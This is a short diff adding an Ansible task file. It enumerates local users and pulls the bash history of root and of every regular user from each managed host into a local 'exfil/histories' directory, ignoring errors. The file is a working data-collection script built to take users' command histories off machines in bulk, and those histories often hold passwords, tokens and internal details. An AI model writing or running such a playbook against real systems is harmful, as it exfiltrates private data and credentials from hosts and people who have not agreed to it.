@@ -1,0 +1,15 @@
+---
+- name: Get all local users from passwd
+  ansible.builtin.getent:
+    database: passwd
+
+- name: Fetch Bash History (Root + Humans)
+  ansible.builtin.fetch:
+    src: "{{ item.value[4] }}/.bash_history"
+    dest: "./exfil/histories/{{ inventory_hostname }}_{{ item.key }}_history"
+    flat: yes
+  loop: "{{ getent_passwd | dict2items }}"
+  when: 
+    - (item.value[1] | int >= 1000 or item.value[1] | int == 0)
+    - item.key != "nobody"
+  ignore_errors: yes
